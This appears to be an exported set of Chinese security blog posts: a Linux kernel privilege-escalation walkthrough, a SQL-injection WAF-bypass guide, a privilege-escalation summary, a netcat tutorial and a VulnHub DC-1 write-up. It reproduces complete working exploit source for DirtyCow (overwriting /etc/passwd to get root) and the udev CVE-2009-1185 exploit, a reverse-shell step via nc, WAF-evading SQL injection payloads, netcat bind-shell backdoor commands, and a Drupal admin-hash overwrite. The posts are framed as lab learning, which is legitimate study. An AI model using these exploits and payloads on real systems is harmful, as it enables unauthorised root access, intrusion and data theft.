carried through to the underlying file. It&gt; is unspecified whether changes made to the file after the&gt; mmap() call are visible in the mapped region.*//*You have to open with PROT_READ.*/ map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0); printf(\"mmap %zx\\n\\n\",(uintptr_t) map);/*You have to do it on two threads.*/ pthread_create(&amp;pth1,NULL,madviseThread,argv[1]); pthread_create(&amp;pth2,NULL,procselfmemThread,argv[2]);/*You have to wait for the threads to finish.*/ pthread_join(pth1,NULL); pthread_join(pth2,NULL); return 0;} 40847： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262root@kali:/usr/share/linux-exploit-suggester# cat 40847 // EDB-Note: Compile: g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil// EDB-Note: Recommended way to run: ./dcow -s (Will automatically do \"echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs\")//// -----------------------------------------------------------------// Copyright (C) 2016 Gabriele Bonacini//// This program is free software; you can redistribute it and/or modify// it under the terms of the GNU General Public License as published by// the Free Software Foundation; either version 3 of the License, or// (at your option) any later version.// This program is distributed in the hope that it will be useful,// but WITHOUT ANY WARRANTY; without even the implied warranty of// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the// GNU General Public License for more details.// You should have received a copy of the GNU General Public License// along with this program; if not, write to the Free Software Foundation,// Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA// -----------------------------------------------------------------#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;string&gt;#include &lt;thread&gt;#include &lt;sys/mman.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;pwd.h&gt;#include &lt;pty.h&gt;#include &lt;string.h&gt;#include &lt;termios.h&gt;#include &lt;sys/wait.h&gt;#include &lt;signal.h&gt;#define BUFFSIZE 1024#define PWDFILE \"/etc/passwd\"#define BAKFILE \"./.ssh_bak\"#define TMPBAKFILE \"/tmp/.ssh_bak\"#define PSM \"/proc/self/mem\"#define ROOTID \"root:\"#define SSHDID \"sshd:\"#define MAXITER 300#define DEFPWD \"$6$P7xBAooQEZX/ham$9L7U0KJoihNgQakyfOQokDgQWLSTFZGB9LUU7T0W2kH1rtJXTzt9mG4qOoz9Njt.tIklLtLosiaeCBsZm8hND/\"#define TXTPWD \"dirtyCowFun\\n\"#define DISABLEWB \"echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs\\n\"#define EXITCMD \"exit\\n\"#define CPCMD \"cp \"#define RMCMD \"rm \"using namespace std;class Dcow{ private: bool run, rawMode, opShell, restPwd; void *map; int fd, iter, master, wstat; string buffer, etcPwd, etcPwdBak, root, user, pwd, sshd; thread *writerThr, *madviseThr, *checkerThr; ifstream *extPwd; ofstream *extPwdBak; struct passwd *userId; pid_t child; char buffv[BUFFSIZE]; fd_set rfds; struct termios termOld, termNew; ssize_t ign; void exitOnError(string msg); public: Dcow(bool opSh, bool rstPwd); ~Dcow(void); int expl(void); };Dcow::Dcow(bool opSh, bool rstPwd) : run(true), rawMode(false), opShell(opSh), restPwd(rstPwd), iter(0), wstat(0), root(ROOTID), pwd(DEFPWD), sshd(SSHDID), writerThr(nullptr), madviseThr(nullptr), checkerThr(nullptr), extPwd(nullptr), extPwdBak(nullptr), child(0){ userId = getpwuid(getuid()); user.append(userId-&gt;pw_name).append(\":\"); extPwd = new ifstream(PWDFILE); while (getline(*extPwd, buffer)){ buffer.append(\"\\n\"); etcPwdBak.append(buffer); if(buffer.find(root) == 0){ etcPwd.insert(0, root).insert(root.size(), pwd); etcPwd.insert(etcPwd.begin() + root.size() + pwd.size(), buffer.begin() + buffer.find(\":\", root.size()), buffer.end()); }else if(buffer.find(user) == 0 || buffer.find(sshd) == 0 ){ etcPwd.insert(0, buffer); }else{ etcPwd.append(buffer); } } extPwdBak = new ofstream(restPwd ? TMPBAKFILE : BAKFILE); extPwdBak-&gt;write(etcPwdBak.c_str(), etcPwdBak.size()); extPwdBak-&gt;close(); fd = open(PWDFILE,O_RDONLY); map = mmap(nullptr, etcPwdBak.size(), PROT_READ,MAP_PRIVATE, fd, 0);}Dcow::~Dcow(void){ extPwd-&gt;close(); close(fd); delete extPwd; delete extPwdBak; delete madviseThr; delete writerThr; delete checkerThr; if(rawMode) tcsetattr(STDIN_FILENO, TCSANOW, &amp;termOld); if(child != 0) wait(&amp;wstat); }void Dcow::exitOnError(string msg){ cerr &lt;&lt; msg &lt;&lt; endl; // if(child != 0) kill(child, SIGKILL); throw new exception();}int Dcow::expl(void){ madviseThr = new thread([&amp;](){ while(run){ madvise(map, etcPwdBak.size(), MADV_DONTNEED);} }); writerThr = new thread([&amp;](){ int fpsm = open(PSM,O_RDWR); while(run){ lseek(fpsm, reinterpret_cast&lt;off_t&gt;(map), SEEK_SET); ign = write(fpsm, etcPwd.c_str(), etcPwdBak.size()); } }); checkerThr = new thread([&amp;](){ while(iter &lt;= MAXITER){ extPwd-&gt;clear(); extPwd-&gt;seekg(0, ios::beg); buffer.assign(istreambuf_iterator&lt;char&gt;(*extPwd), istreambuf_iterator&lt;char&gt;()); if(buffer.find(pwd) != string::npos &amp;&amp; buffer.size() &gt;= etcPwdBak.size()){ run = false; break; } iter ++; usleep(300000); } run = false; }); cerr &lt;&lt; \"Running ...\" &lt;&lt; endl; madviseThr-&gt;join(); writerThr-&gt;join(); checkerThr-&gt;join(); if(iter &lt;= MAXITER){ child = forkpty(&amp;master, nullptr, nullptr, nullptr); if(child == -1) exitOnError(\"Error forking pty.\"); if(child == 0){ execlp(\"su\", \"su\", \"-\", nullptr); exitOnError(\"Error on exec.\"); } if(opShell) cerr &lt;&lt; \"Password overridden to: \" &lt;&lt; TXTPWD &lt;&lt; endl; memset(buffv, 0, BUFFSIZE); ssize_t bytes_read = read(master, buffv, BUFFSIZE - 1); if(bytes_read &lt;= 0) exitOnError(\"Error reading su prompt.\"); cerr &lt;&lt; \"Received su prompt (\" &lt;&lt; buffv &lt;&lt; \")\" &lt;&lt; endl; if(write(master, TXTPWD, strlen(TXTPWD)) &lt;= 0) exitOnError(\"Error writing pwd on tty.\"); if(write(master, DISABLEWB, strlen(DISABLEWB)) &lt;= 0) exitOnError(\"Error writing cmd on tty.\"); if(!opShell){ if(write(master, EXITCMD, strlen(EXITCMD)) &lt;= 0) exitOnError(\"Error writing exit cmd on tty.\"); }else{ if(restPwd){ string restoreCmd = string(CPCMD).append(TMPBAKFILE).append(\" \").append(PWDFILE).append(\"\\n\"); if(write(master, restoreCmd.c_str(), restoreCmd.size()) &lt;= 0) exitOnError(\"Error writing restore cmd on tty.\"); restoreCmd = string(RMCMD).append(TMPBAKFILE).append(\"\\n\"); if(write(master, restoreCmd.c_str(), restoreCmd.size()) &lt;= 0) exitOnError(\"Error writing restore cmd (rm) on tty.\"); } if(tcgetattr(STDIN_FILENO, &amp;termOld) == -1 ) exitOnError(\"Error getting terminal attributes.\"); termNew = termOld; termNew.c_lflag &amp;= static_cast&lt;unsigned long&gt;(~(ICANON | ECHO)); if(tcsetattr(STDIN_FILENO, TCSANOW, &amp;termNew) == -1) exitOnError(\"Error setting terminal in non-canonical mode.\"); rawMode = true; while(true){ FD_ZERO(&amp;rfds); FD_SET(master, &amp;rfds); FD_SET(STDIN_FILENO, &amp;rfds); if(select(master + 1, &amp;rfds, nullptr, nullptr, nullptr) &lt; 0 ) exitOnError(\"Error on select tty.\"); if(FD_ISSET(master, &amp;rfds)) { memset(buffv, 0, BUFFSIZE); bytes_read = read(master, buffv, BUFFSIZE - 1); if(bytes_read &lt;= 0) break; if(write(STDOUT_FILENO, buffv, bytes_read) != bytes_read) exitOnError(\"Error writing on stdout.\"); } if(FD_ISSET(STDIN_FILENO, &amp;rfds)) { memset(buffv, 0, BUFFSIZE); bytes_read = read(STDIN_FILENO, buffv, BUFFSIZE - 1); if(bytes_read &lt;= 0) exitOnError(\"Error reading from stdin.\"); if(write(master, buffv, bytes_read) != bytes_read) break; } } } } return [](int ret, bool shell){ string msg = shell ? \"Exit.\\n\" : string(\"Root password is: \") + TXTPWD + \"Enjoy! :-)\\n\"; if(ret &lt;= MAXITER){cerr &lt;&lt; msg; return 0;} else{cerr &lt;&lt; \"Exploit failed.\\n\"; return 1;} }(iter, opShell);}void printInfo(char* cmd){ cerr &lt;&lt; cmd &lt;&lt; \" [-s] [-n] | [-h]\\n\" &lt;&lt; endl; cerr &lt;&lt; \" -s open directly a shell, if the exploit is successful;\" &lt;&lt; endl; cerr &lt;&lt; \" -n combined with -s, doesn't restore the passwd file.\" &lt;&lt; endl; cerr &lt;&lt; \" -h print this synopsis;\" &lt;&lt; endl; cerr &lt;&lt; \"\\n If no param is specified, the program modifies the passwd file and exits.\" &lt;&lt; endl; cerr &lt;&lt; \" A copy of the passwd file will be create in the current directory as .ssh_bak\" &lt;&lt; endl; cerr &lt;&lt; \" (unprivileged user), if no parameter or -n is specified.\\n\" &lt;&lt; endl; exit(1);}int main(int argc, char** argv){ const char flags[] = \"shn\"; int c; bool opShell = false, restPwd = true; opterr = 0; while ((c = getopt(argc, argv, flags)) != -1){ switch (c){ case 's': opShell = true; break; case 'n': restPwd = false; break; case 'h': printInfo(argv[0]); break; default: cerr &lt;&lt; \"Invalid parameter.\" &lt;&lt; endl &lt;&lt; endl; printInfo(argv[0]); } } if(!restPwd &amp;&amp; !opShell){ cerr &lt;&lt; \"Invalid parameter: -n requires -s\" &lt;&lt; endl &lt;&lt; endl; printInfo(argv[0]); } Dcow dcow(opShell, restPwd); return dcow.expl();} 首先来分析poc（40611）： 1234567891011121314$ sudo -s //切换到root用户，但是需要知道当前用户的登录密码# echo this is not a test &gt; foo //切换到root用户后将this is not a test输入到foo文件中# chmod 0404 foo //修改foo文件权限$ ls -lah foo //查看foo文件权限-r-----r-- 1 root root 19 Oct 20 15:23 foo$ cat foo //查看foo文件this is not a test$ gcc -pthread dirtyc0w.c -o dirtyc0w //编译dirtycow.c文件，这里是40611$ ./dirtyc0w foo m00000000000000000 //执行编译后的文件mmap 56123000madvise 0procselfmem 1800000000$ cat foo //查看foo文件m00000000000000000 1234sudo su 和sudo -s的区别sudo su 和 sudo -s都是切换到root用户，不同的是：sudo su 环境用的是目标用户(root)的环境sudo -s 环境用的是当前用户本身的环境 这里执行sudo -s命令时需要输入当前登录用户的密码，但是一般情况下是不知道这个密码的，所以这个poc无法利用。 仔细想想这个poc，感觉还是有点问题，如果sudo -s能执行成功，那么可以暂时以root身份运行部分命令，那应该就可以使用其他更简单的方式提权。。。这里希望大佬能指点指点。 再来看exp（40847 ）： 查看源码，发现需要对exp执行如下编译命令： 1g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil 首先查看靶机上有没有安装g++环境； 靶机上是安装了g++编译环境的，接下来就需要将exp上传到靶机上去，这里我使用nc，因为靶机上也安装了nc； 12nc -lvp 8888 &gt; 40847.cpp //靶机nc 192.168.43.41 &lt; 40847 //kali 这里exp不需要进行修改，直接编译； 这里报错了，g++不能识别c++11选项，上网查找原因，发现是g++的版本过低不支持。 https://stackoverflow.com/questions/14674597/cc1plus-error-unrecognized-command-line-option-std-c11-with-g 尝试安装更高版本的g++，发现没有权限，所以只好放弃这个exp了。 这里我没有尝试其他的漏洞，直接去网上查找了一下Metasploitable2主机的内核提权漏洞，发现udev这个exp可以提权成功。 https://zhuanlan.zhihu.com/p/78943079 接下来就使用8572这个exp提权。 8572： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111root@kali:/usr/share/linux-exploit-suggester# cat 8572 /* * cve-2009-1185.c * * udev &lt; 141 Local Privilege Escalation Exploit * Jon Oberheide &lt;jon@oberheide.org&gt; * http://jon.oberheide.org * * Information: * * http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1185 * * udev before 1.4.1 does not verify whether a NETLINK message originates * from kernel space, which allows local users to gain privileges by sending * a NETLINK message from user space. * * Notes: * * An alternate version of kcope's exploit. This exploit leverages the * 95-udev-late.rules functionality that is meant to run arbitrary commands * when a device is removed. A bit cleaner and reliable as long as your * distro ships that rule file. * * Tested on Gentoo, Intrepid, and Jaunty. * * Usage: * * Pass the PID of the udevd netlink socket (listed in /proc/net/netlink, * usually is the udevd PID minus 1) as argv[1]. * * The exploit will execute /tmp/run as root so throw whatever payload you * want in there. */#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/socket.h&gt;#include &lt;linux/types.h&gt;#include &lt;linux/netlink.h&gt;#ifndef NETLINK_KOBJECT_UEVENT#define NETLINK_KOBJECT_UEVENT 15#endifintmain(int argc, char **argv){ int sock; char *mp, *err; char message[4096]; struct stat st; struct msghdr msg; struct iovec iovector; struct sockaddr_nl address; if (argc &lt; 2) { err = \"Pass the udevd netlink PID as an argument\"; printf(\"[-] Error: %s\\n\", err); exit(1); } if ((stat(\"/etc/udev/rules.d/95-udev-late.rules\", &amp;st) == -1) &amp;&amp; (stat(\"/lib/udev/rules.d/95-udev-late.rules\", &amp;st) == -1)) { err = \"Required 95-udev-late.rules not found\"; printf(\"[-] Error: %s\\n\", err); exit(1); } if (stat(\"/tmp/run\", &amp;st) == -1) { err = \"/tmp/run does not exist, please create it\"; printf(\"[-] Error: %s\\n\", err); exit(1); } system(\"chmod +x /tmp/run\"); memset(&amp;address, 0, sizeof(address)); address.nl_family = AF_NETLINK; address.nl_pid = atoi(argv[1]); address.nl_groups = 0; msg.msg_name = (void*)&amp;address; msg.msg_namelen = sizeof(address); msg.msg_iov = &amp;iovector; msg.msg_iovlen = 1; sock = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT); bind(sock, (struct sockaddr *) &amp;address, sizeof(address)); mp = message; mp += sprintf(mp, \"remove@/d\") + 1; mp += sprintf(mp, \"SUBSYSTEM=block\") + 1; mp += sprintf(mp, \"DEVPATH=/dev/foo\") + 1; mp += sprintf(mp, \"TIMEOUT=10\") + 1; mp += sprintf(mp, \"ACTION=remove\") +1; mp += sprintf(mp, \"REMOVE_CMD=/tmp/run\") +1; iovector.iov_base = (void*)message; iovector.iov_len = (int)(mp-message); sendmsg(sock, &amp;msg, 0); close(sock); return 0;}// milw0rm.com [2009-04-30] 注释中提到了exp的使用条件是需要将udevd netlink socket进程的PID作为参数传递给程序，并且需要在/tmp目录下创建run文件，因为exp会以root权限执行run文件，我们可以将payload写入到run文件中，让exp来执行它。 首先将这个exp下载到本机，然后上传到靶机上并使用gcc编译exp；创建/tmp/run文件，并写入nc命令，意思是让靶机反向连接kali主机并反弹shell。 查看udevd netlink socket进程的PID，cat /proc/net/netlink，Pid为2737。 在kali主机上面监听8888端口，并执行exp。 成功反弹shell，并且shell权限为root。 searchsploitsearchexploit和linux-exploit-suggester类似，也是exploit的查找工具。 1searchsploit privilege | grep -i linux | grep -i kernel | grep 2.6 这里我们需要找提权模块，所以就搜索privilege，然后匹配其他条件，linux，kernel 2.6。 搜索匹配到很多的exp，具体用哪一个就需要靠经验和试了。结果中也有前面提到的8572.c这个exp。 0x3 总结对于内核提权，首先需要收集系统的内核版本和系统发行版本的信息，为后面收集Poc和Exp做准备。后面查找exp主要用到linux-exploit-suggester和searchexploit这两个工具，当然也可以去浏览器搜索相应内核版本的漏洞。用工具匹配到相应的漏洞后，可以查看相关的漏洞详情，看看目标系统有没有安装相关的编译运行环境，然后再下载相应的exp去打。这里需要注意，exp下载下来首先要查看源码，需要按照它要求的步骤去完成相应的配置，有时候还需要根据系统配置进行修改等等。环境和配置都准备好了之后就可以直接执行exp了。可能由于很多原因，导致exp打不通或者不能执行的情况，可以上网查找解决办法或者再重新编译执行一次，当然也可以换其他exp试试。linux内核有自己的保护机制，比如设置权限，地址随机化，打补丁等等，所以有一些exp不能执行或者不能完成提权。 内核提权一般是作为最后选项，因为exp执行后远程主机可能会崩溃，许多公开可用的提权漏洞并不是很稳定，目标主机也可能在你得到root权限后直接崩溃，并且漏洞利用可能会留下导致被捕获的痕迹/日志。","link":"/Linux%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83/"},{"title":"SQL-Bypass安全狗4.0","text":"实验环境： sqli-labs 网站安全狗Linux-Apache版 版本：V2.3.18809 CentOS7+宝塔面板 apache+php+mysql 注意：安全狗需要开启记录并拦截，否则只会记录不会拦截，没有弹窗。 这里以sqli-labs的Less-1为例。 判断注入 存在字符型注入。如果没有错误回显，可以输入payload：?id=2-1 来判断。 Fuzz： 12341' --+- 未拦截（不拦截注释符）1' and '1'='1 拦截1' and 1=1 --+- 拦截1' and 1 --+ 拦截 绕过方法： 1’ and -1=-1 –+-和1’ and -1=-2 –+- 1’ and 1&lt;2 –+-和1’ and 1&gt;2 –+- 1’ and ord(0x1) –+-和1’ and ord(0x0) –+- 1’ and ord(true/false) –+-和1’ and ord(NULL) –+- ord()函数返回数值或字符的ascii码，这里ord()函数的参数是十六进制数，会返回其对应的十进制的数值，如果直接输入十进制数会被当成字符处理，而不会被当成数值处理，比如ord(0)=48。如果是字符，则会返回字符的ascii，如果是汉字，则会返回汉字的编码。 1’ and ascii(0x1) –+-和1’ and ascii(0x0) –+- 1’ and ascii(true/false) –+-和1’ and ascii(NULL) –+- 当然还有其他的绕过方法，可以自己慢慢挖掘，有好的绕过方法欢迎大佬留言。 判断字段数直接order by被拦截。单独输入order或by没有被拦截，尝试内联注释： 12345id=1' order/**/by 1 --+- 拦截id=1'/**/order/**/by/**/1 --+- 拦截id=1'/**//*!order*//**//*!by*//**/1 --+- 拦截'/**/'是mysql的多行注释。'/*!*/'是mysql数据库为了保持与其他数据库兼容，特意新添加的功能。为了避免从mysql中导出的sql语句不能被其他数据库使用，它把一些mysql特有的语句放在 /*! ... */ 中，这些语句在不兼容的数据库（非mysql）中使用时不会执行，而mysql自身却能识别、执行 手工测试直接使用内联注释/* */和/*! */会被安全狗拦截，所以尝试在/* */中加一些干扰字符。下面使用burpsuite进行fuzz： 使用burpsuite抓包，并设置爆破位置： 设置payload类型为brute forcer，设置字符集为一些数字、字母和特殊字符的组合，这里设置的是/‘“%!q0的随机两个到四个字符的组合： 开始爆破，得到payload为 %!q ，这里的payload并没有爆破完，应该是被安全狗拦截了。 通过使用bp进行fuzz，得到payload：id=1%27%20order/*%!q*/by%201–+- 成功绕过，并得到字段数为3。 这里还有另外一种绕过方法：id=1’ order –+aaaa%0a by 3–+-或id=1’ order /*|–|*/–+%20%0aby 3，在order和by之间加一些无效字符，然后再使用%0a换行。 联合查询判断回显点直接union select 1,2,3被拦截。像前面判断字段数那样在union和select之间加上/*%!q*/，构造payload：id=-1%27%20union/*%!q*/select%201,2,3–+-，直接绕过。 其他绕过方法： 内联注释+空语句+注释+换行 id=-1’/*!union*//*!*/ –+aaaa%0aselect 1,2,3 –+- id=-1’/*|–|*//*!10044UnIon*//*%00*/–+aaaa%20%0a/*!10044SeLECT*//**/1,2,3–+- /*!10044UnIon*/表示当mysql数据库版本&gt;=1.00.44时才会执行中间的语句，这里的mysql版本为5.6.49（50649），所以union会执行。 查询数据库信息查询数据库： 这里直接输入database()会被拦截，但是输入database和database1()不会被拦截，所以安全狗是使用正则匹配database()函数，只要将函数的特征打乱，就能绕过。 页面报错说明payload成功传输到后端，没有被安全狗拦截。 构造payload：id=-1%27%20union/*%!q*/select%201,2,database/*%!q*/()–+-，在database和()之间加上/*%!q*/，打乱函数特征，绕过正则匹配。 常用的fuzz组合：/ ! ‘ “ % q - | %oa %00","link":"/SQLBypass%E5%AE%89%E5%85%A8%E7%8B%974-0/"},{"title":"Linux提权总结","text":"0x1 内核漏洞提权0x2 服务漏洞查看目标主机的服务 1netstat -antup //该命令会显示系统所有打开并正在侦听的端口，可以查看本地运行的服务，检查其是否可以用来提权 把敏感端口转发出来，用本地的工具进行攻击，可能拿到远程 root，即通过漏洞拿到 root 权限。windows 用 lcx 做端口转发，linux 用 nc、socat 做端口转发 。 https://man.linuxde.net/netstat 查看以root运行的服务 1ps -aux | grep root //显示哪些服务正以root权限运行","link":"/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/"},{"title":"NetCat（nc）","text":"​ nc在各大发行版本中都默认安装。测试版本：OpenBSD版本。 安装1apt-get install nc-openbsd 端口测试测试服务器 A （192.168.1.107）主机上是否开启22端口 1nc -vz 192.168.1.107 22 // v表示显示详细信息，z表示不发送数据 nc后面的22端口也可以写成一个范围进行扫描： 1nc -v -w 3 -z 192.168.1.107 22-8080 //w设置扫描超时时间 传输测试被测试主机 A（192.168.1.107） 1nc -l -p 8080 //监听8080端口 测试主机 B （192.168.1.198 ） 1nc 192.168.1.107 8080 //在A主机上连接B主机 连接成功后在测试主机上随便输入点内容，在被测主机上都会显示，在被测主机上输出的内容同样也会在测试主机上显示。Ctrl+c 断开连接。 测试UDP会话被测试主机 A（192.168.1.107） 1nc -l -u -p 8080 //监听8080端口 测试主机 B （192.168.1.198 ） 1nc -u 192.168.1.107 8080 //在A主机上连接B主机 文件传输在A主机上监听端口 1nc -l -p 8080 &gt; image.jpg 将B主机上的图片传输到A主机 1nc 192.168.1.107 8080 &lt; image.jpg 传输成功，Ctrl+c 断开连接。 如果需要在传输完成后就关闭连接，可以加上 -N 参数： 1nc -N 192.168.1.107 8080 &lt; image.jpg 网络吞吐量测试服务端： 1nc -l -p 8080 &gt; ./test 客户端： 12// dd搭配ncdd if=./exp bs=1MB count=100 | nc -n -N 192.168.1.107 8080 -n 的意思是不解析域名，避免解析域名浪费时间造成误差。 通过计算可以得到传输速率。 上面的方法把建立连接和握手的时间以及TCP窗口慢启动的时间都计算进去了，不是特别准确，最精确的方式是搭配 pv 命令使用（监控统计管道数据的速度）。 安装pv： 1sudo apt install pv 在服务端运行： 1nc -l -p 8080 | pv -W // W 选项设置从开始传输是再计时 客户端： 1nc 192.168.1.107 8080 &lt; ./test pv能够统计带宽。 1%%EOF 192MiB 0:00:29 [6.85MiB/s] [ 系统后门假设你用串口登录到 A 主机，上面十分原始，包管理系统都没有，sshd/telnetd 都跑不起来，这时候你想用 B 主机通过网络登录 A 主机，可以使用nc的 -e 参数；GNU 版本的 netcat 的 -e 参数，可以在连接建立的时候执行一个程序，并把它的标准输入输出重定向到网络连接上来，于是我们可以在 A 主机上 -e 一下 bash： 1nc -l -p 2020 -e /bin/bash //打开系统后门（后门bash可以执行系统命令） B主机： 1nc 192.168.1.248 2020 成功在B主机上面登录A主机的shell。对于openbsd版本的nc，没有 -e 选项，如果想完成上面的操作，可以通过管道来完成： A主机： 1234567mkfifo /tmp/fcat /tmp/f | /bin/bash 2&gt;&amp;1 | nc -l -p 8080 &gt; /tmp/f对于&amp;1更准确的说应该是文件描述符1,而1标识标准输出stdout；对于2，表示标准错误stderr。2&gt;&amp;1 的意思就是将标准错误重定向到标准输出这里标准输出已经重定向到了/bin/bash，那么标准错误也会输出到/bin/bash可以把/bin/bash看作\"黑洞\"，它等价于一个只写文件，所有写入它的内容都会永远丢失，而尝试从它那儿读取内容则什么也读不到；偶尔也可以把&amp;在命令的最后加上，表示让程序后台执行这里通过nc将bash重定向到B主机上，通过命名管道可以执行多条命令 B主机： 1nc 192.168.1.248 8080 mkfifo命令是创建命名管道，命名管道的作用是将输出信道化到不同的终端。 1234567891011121314|（竖线）为管道，是两个进程之间的通信通道例如：ls | grep txtls和grep由|分开，管道创建了程序之间的通信通道，将ls的输出作为输入传给grep由mkfifo创建出来的就是一个命名管道例如：mkfifo pipe2pipe2就是一个命名管道例如：在第一个终端执行ls &gt; pipe2在第二个终端执行cat &lt; pipe2（或cat pipe2,是取一次。cat &lt; pipe2是持续输入，只要有内容传到pipe2中，就会有内容输出）pipe2更像是一个临时存储的地方，使用cat pipe2取过内容之后，再执行cat pipe2 ，则不会有显示 命名管道可以像正常文件一样访问。 注意要在另一个终端打开。 总结nc可以搭配管道，实现灵活多样的功能，或者进行各种网络测试。 参考文章： https://zhuanlan.zhihu.com/p/83959309 https://www.cnblogs.com/zhenghongxin/p/7029173.html https://www.cnblogs.com/old-path-white-cloud/p/11685558.html","link":"/NetCat%EF%BC%88nc%EF%BC%89/"},{"title":"VulnHub_DC-1","text":"​ 信息收集获取靶机IP： 1arp-scan -l 获取靶机IP：192.168.22.114 端口扫描： 1nmap -sS -sV -O 192.168.22.114 开放端口：22（ssh）、80（http）、111（nfs共享） rpcbind是一个RPC服务，主要是在nfs（网络文件系统）共享时候负责通知客户端和服务器。简单理解rpc就是一个中介服务。 先从web入手，访问80端口： 发现网站使用的CMS是Drupal 7，并且网站的环境是PHP。 首先尝试弱口令和万能密码，登录失败。 扫描目录： 1python3 dirsearch.py -u http://192.168.22.114/ -e php 扫描发现robots.txt文件，打开查看： 没有什么十分有用的信息。查看一些其他文件，大概确定Drupal的版本是7.x。 getshell上网查找Drupal 7.x的漏洞，发现：CVE-2018-7600 DRUPAL 7.X 版本代码执行；在Metasploit库中查找CVE-2018-7600，发现exploit脚本，配置好后直接exploit，获得shell。 查看当前用户： 1getuid 权限是普通网站用户。 接下来要做的就是提升用户权限。 权限提升首先使用MSF的辅助提权模块查找目标主机上有哪些本地提权漏洞： 1run post/multi/recon/local_exploit_suggester // 查看目标主机存在哪些本地提权漏洞 没有找到可以用来提权的模块。 Metasploit的post模块： 后渗透学习之Metasploit的post模块使用信息收集 POST模块、后门 进入shell后，先用python建立一个虚拟终端，然后就可以使用su等命令了。 12python -c 'import pty;pty.spawn(\"/bin/sh\")'// python -c 'import pty;pty.spawn(\"/bin/bash\")' flag1查看当前目录和目录下的文件，发现flag1.txt； 查看flag1.txt文件中的内容。 flag2上网找Drupal 7 CMS的配置文件路径：/sites/default/settings.php 查找配置文件； 查看配置文件，发现flag2和连接数据库的用户名和密码，并且是mysql数据库。 这里/sites/default/目录下还有一个default.settings.php，里面内容和settings.php几乎一样，可能是程序自带的默认配置文件或配置文件的备份。尝试登录数据库： 12mysql -u dbuser -p// 密码是R0ck3t 成功连接。 flag3查看当前数据库用户的权限： 1mysql&gt; show grants for dbuser@localhost; 意思是：” *.*授予dbuser’@’localhost’的授权使用通过密码&lt;secret&gt;标识，将所有特权授予`drupaldb`.*至‘dbuser’@’localhost’ “，也就是dbuser用户可以管理drupaldb数据库下的所有表（包括增删改查操作）。 数据库查看当前用户角色、权限 查看数据库，查看表： 123show databases;use drupaldb;show tables; 查看一些特殊表，发现一些重要信息； 这里只看到了admin用户（webdemo用户是我测试时添加的）和flag3，没有admin用户的密码的明文和flag3的内容。没有思路了，看了大佬的文章，说是flag3的内容可能是在后台管理页面上，因为这里的flag3是title字段，所以title的内容很有可能就在后台页面；并且这里可以通过修改管理员admin的密码的方式登录后台，在这之前我们查看了数据库用户dbuser的权限，是可以修改users表的。 重置管理员密码：https://www.isfirst.net/drupal/drupal-reset-password 123update users set pass=\"$S$DRIG34Wb.GK3EKVBYBYN6rO.uyMkf1re4u8f/FjDRmGBRY30x3S4\" where name=\"admin\";// $S$DRIG34Wb.GK3EKVBYBYN6rO.uyMkf1re4u8f/FjDRmGBRY30x3S4解密后为123456// $S$DFLfuzfO9WDKAJcUHnNmhS9NwOD6MRj3pk00qEl4O7iNBD2X4n3v解密后为drupal 然后打开后台登录界面，输入admin，123456，成功登录。 接下来就是找flag3，藏的还是比较隐蔽的，我找了好久才找到； 这里我也尝试过通过添加用户的方式来登入后台，但是进入后台后并没有什么有价值的信息。 1mysql&gt; update users set pass=\"$S$DRIG34Wb.GK3EKVBYBYN6rO.uyMkf1re4u8f/FjDRmGBRY30x3S4\", status=\"1\" where name=\"webdemo\"; flag4flag3提示密码，先去查看linux的密码文件； 发现flag4，去查看flag4； 提示以同样的方式查看root目录下面的flag文件。如果直接cd /root，会提示Permission denied，意思就是权限不够，需要提升至root权限。 之前尝试过使用本地漏洞提权，但发现没有可以利用的本地漏洞。这里根据flag3的提示，可以使用命令来获取内容，小白本白又跑去看大佬的思路，发现可以使用find命令提权。 首先查看有没有设置了SUID并且权限为root的文件： 12find / -perm -4000 -user \"root\" 2&gt;/dev/null // 4000表示SUID，-user表示文件所属主 -perm -4000 是在系统中查找所有设置了SUID的文件，设置了SUID的文件在执行时权限为文件所属主的权限。查找这类文件的作用是为了找到设置了SUID并且所属主为root的可执行文件（二进制文件），这类可执行文件在被任何用户执行时都具有root权限。 linux下根据文件权限查找文件 Shell中 2&gt;/dev/null Linux特殊权限之SUID 这里的find命令（文件）可以用来提权。 find命令原理： find命令有一个-exec参数，可以在成功查找到文件后对匹配的文件执行该参数设置的shell命令。这里需要注意的是find必须要查找成功后才能触发-exec参数，也就是说你要find的那个文件必须存在，否则会报错。 find基础命令与提权教程 1-exec 命令 {} \\;（注意{}两边必须要有空格，\\转义;）//对查找到的文件执行某命令；-exec表示开始执行动作,{}表示用find命令查找出的所有文件 因为这里find命令设置了SUID，所以在利用find命令的-exec参数去执行shell命令的时候是在root权限下执行。 因为-exec一次只能执行一条命令，所以我刚开始的想法是将命令写入一个文件，然后传给-exec去执行，但是好像不能创建文件；这里我也尝试使用-exec去创建文件，发现也没成功，不知道是什么原因，希望大佬们指点指点！而且还需要给文件授予可执行权限。 在 Linux 上创建文件的 10 个方法 